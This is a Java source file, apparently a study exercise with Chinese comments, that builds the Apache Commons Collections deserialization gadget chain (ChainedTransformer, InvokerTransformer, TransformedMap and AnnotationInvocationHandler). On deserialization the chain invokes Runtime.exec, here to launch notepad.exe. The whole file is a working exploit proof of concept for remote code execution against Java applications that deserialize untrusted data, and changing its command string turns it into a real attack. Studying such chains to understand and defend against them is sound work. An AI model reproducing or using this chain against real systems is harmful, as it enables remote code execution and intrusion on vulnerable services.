package Test;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;


/**
 * 本类是参考网络文章写的
 */


public class Test {
    public static void main(java.lang.String[] args) throws Exception {
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",
//                new Class[]{String.class},
//                new Object[]{"notepad.exe"});
//        seriliaze(invokerTransformer);
//        InvokerTransformer in = (InvokerTransformer) unseriliaze();
//        in.transform(Runtime.getRuntime());//实际生产中不可能有这样的代码，怎么实现向transform传入Runtime对象？
//        invokerTransformer.transform(Runtime.getRuntime());

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                //第二个参数：getMethod方法的参数类型，第三个参数中的第二个参数是getRuntime的参数。new Class[0]表示方法无参数
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{new Class[0],new Class[0]}),
                //第二个参数：invoke方法的参数类型，
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"notepad.exe"})
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
//        transformerChain.transform("");
        Map innermap = new HashMap();
        innermap.put("value","test");
        Map outermap = TransformedMap.decorate(innermap,null,transformerChain);
        //该类是包权限，无法实例化，只能反射调用
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cl.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(java.lang.annotation.Retention.class,outermap);

        ByteArrayOutputStream exp = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(exp);
        oos.writeObject(obj);
        oos.flush();
        oos.close();

        ByteArrayInputStream out = new ByteArrayInputStream(exp.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(out);
        Object o = (Object) ois.readObject();





//        Transformer[] transformers = new Transformer[] {
//                //传入Runtime类
//                new ConstantTransformer(Runtime.class),
//                //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法
//                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
//                //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象
//                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
//                //反射调用exec方法
//                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"notepad.exe"})
//        };
//        Transformer transformerChain = new ChainedTransformer(transformers);
//        transformerChain.transform("");
    }

    public static void seriliaze(Object o) throws IOException {
        ObjectOutputStream objectInputStream = new ObjectOutputStream(new FileOutputStream("./test.dat"));
        objectInputStream.writeObject(o);
    }
    public static Object unseriliaze() throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("./test.dat"));
        return objectInputStream.readObject();
    }

}
